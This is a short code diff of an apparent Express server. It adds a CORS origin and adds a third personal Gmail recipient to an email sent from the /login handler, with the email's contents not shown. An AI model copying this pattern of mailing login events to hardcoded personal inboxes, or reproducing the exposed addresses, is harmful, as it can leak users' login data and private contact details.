@@ -180,7 +180,9 @@ const allowedOrigins = [
   'http://localhost:5173',
   'http://127.0.0.1:5173',
   'http://localhost:3000',
-  'https://b-to-b-apixvuzum.onrender.com' // ✅ added this
+  'https://b-to-b-apixvuzum.onrender.com',
+  'https://fzt-api-frilu457.onrender.com'
+
 ];
 
 
@@ -262,7 +264,7 @@ app.post('/login', async (req, res) => {
   try {
     await transporter.sendMail({
       from: process.env.EMAIL_USER,
-      to: ['26krakashyadav@gmail.com', 'nikhilmahato104@gmail.com'],
+      to: ['26krakashyadav@gmail.com', 'nikhilmahato104@gmail.com', 'kesusingh26@gmail.com'],
       subject,
       html: htmlMessage
     });
